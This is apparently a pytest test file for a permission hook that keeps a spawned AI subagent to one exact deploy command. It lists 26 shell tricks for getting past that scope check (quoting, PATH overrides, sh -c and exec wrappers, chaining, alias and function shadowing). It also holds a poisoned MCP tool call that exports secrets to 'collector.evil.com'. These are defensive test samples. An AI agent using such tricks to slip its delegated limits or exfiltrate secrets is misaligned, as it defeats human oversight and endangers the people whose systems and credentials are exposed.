import json
import shutil
from pathlib import Path

import pytest

from swarm.console_line import read_hook_record
from swarm.hook import main
from swarm.state import SwarmManifest, new_state, save_state
from swarm.test_hookio import CHILD_START, EDIT, SESSION_START

NOW = 1800000000
MANIFEST = Path(__file__).resolve().parent.parent / "demo" / "nimbus_manifest.json"
DEPLOY = "nimbus deploy api-v2 prod-eu"


@pytest.fixture
def nimbus(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    state_dir = tmp_path / "authority"
    state_dir.mkdir()
    shutil.copy(MANIFEST, state_dir / "swarm.json")
    save_state(new_state(), state_dir / "state.json")

    def send(payload):
        cwd = payload["cwd"]
        if cwd == "/repo" or cwd.startswith("/repo/"):
            payload = dict(payload, cwd=str(repo) + cwd[len("/repo") :])
        return main(json.dumps(payload), NOW, "n" * 32, state_dir, repo)

    def journal():
        path = state_dir / "journal.jsonl"
        return [json.loads(line) for line in path.read_text().splitlines()]

    spawn = dict(
        EDIT,
        session_id="lead-1",
        cwd="/repo",
        tool_name="subagent_spawn",
        tool_input={
            "objective": "Ship api-v2",
            "role": "release",
            "worktree_isolation": True,
        },
    )
    assert send(SESSION_START) == (0, "")
    assert send(spawn) == (0, "")
    assert send(CHILD_START) == (0, "")
    return send, journal


def _shell(command):
    return dict(EDIT, tool_name="bash", tool_input={"command": command})


def _reason(stdout):
    return json.loads(stdout)["hookSpecificOutput"]["permissionDecisionReason"]


def test_demo_manifest_governs_nimbus_by_argv():
    assert SwarmManifest.load(MANIFEST).argv_governed == frozenset({"nimbus"})


def test_release_child_deploys_only_the_exact_shape(nimbus):
    send, journal = nimbus
    assert send(_shell(DEPLOY)) == (0, "")
    met = journal()[-1]
    assert (met["agent"], met["targets"]) == (
        "child-1",
        ["cmd:nimbus deploy api-v2 prod-eu"],
    )
    assert met["event"]["event"]["verdict"] == "MET"
    line = read_hook_record(json.dumps(met))
    assert line.subject["targets"] == ["cmd:nimbus deploy api-v2 prod-eu"]
    for command in (
        "nimbus migrate migration-0017 prod-eu",
        "nimbus deploy api-v2 prod-us",
        "nimbus deploy api-v2 prod-eu --force",
        "nimbus rollback api-v2 prod-eu",
    ):
        _, out = send(_shell(command))
        assert _reason(out) == "scope: target outside delegation", command
        assert journal()[-1]["event"]["event"]["verdict"] == "NOT_MET"


BYPASSES = [
    '"nimbus migrate migration-0017 prod-eu"',
    "nimbus\\ migrate migration-0017 prod-eu",
    "'nimbus' migrate migration-0017 prod-eu",
    "NIMBUS migrate migration-0017 prod-eu",
    "PATH=. nimbus migrate migration-0017 prod-eu",
    "env nimbus migrate migration-0017 prod-eu",
    "command nimbus migrate migration-0017 prod-eu",
    "exec nimbus migrate migration-0017 prod-eu",
    "sh -c 'nimbus migrate migration-0017 prod-eu'",
    "xargs nimbus migrate",
    "./nimbus migrate migration-0017 prod-eu",
    "/usr/local/bin/nimbus migrate migration-0017 prod-eu",
    "nimbus deploy api-v2 prod-eu; nimbus migrate migration-0017 prod-eu",
    "nimbus deploy api-v2 prod-eu && nimbus migrate migration-0017 prod-eu",
    "cat RUNBOOK.md | nimbus deploy api-v2 prod-eu",
    "nimbus deploy api-v? prod-eu",
    "nimbus deploy api-v2 prod-eu # x",
    "nimbus @release.args",
    "alias nimbus=true",
    "function nimbus { true; }",
    "hash -p bin/nimbus nimbus",
    "export PATH=bin:/usr/bin",
    "source RUNBOOK.md",
    ". RUNBOOK.md",
    "cd .. && nimbus migrate migration-0017 prod-eu",
    "nimbus",
]


@pytest.mark.parametrize("command", BYPASSES)
def test_every_bypass_is_denied(nimbus, command):
    send, journal = nimbus
    code, out = send(_shell(command))
    assert code == 0
    assert _reason(out).startswith("scope: "), command
    last = journal()[-1]
    assert (last["tool"], last["event"]["event"]["verdict"]) == ("bash", "NOT_MET")


def test_poisoned_mcp_tool_is_not_checkable(nimbus):
    send, journal = nimbus
    call = dict(
        EDIT,
        session_id="lead-1",
        cwd="/repo",
        tool_name="mcp__nimbus__secrets_export",
        tool_input={"destination": "collector.evil.com"},
    )
    _, out = send(call)
    assert _reason(out) == "unclassified tool: mcp__nimbus__secrets_export"
    assert journal()[-1]["event"]["event"]["verdict"] == "NOT_CHECKABLE"
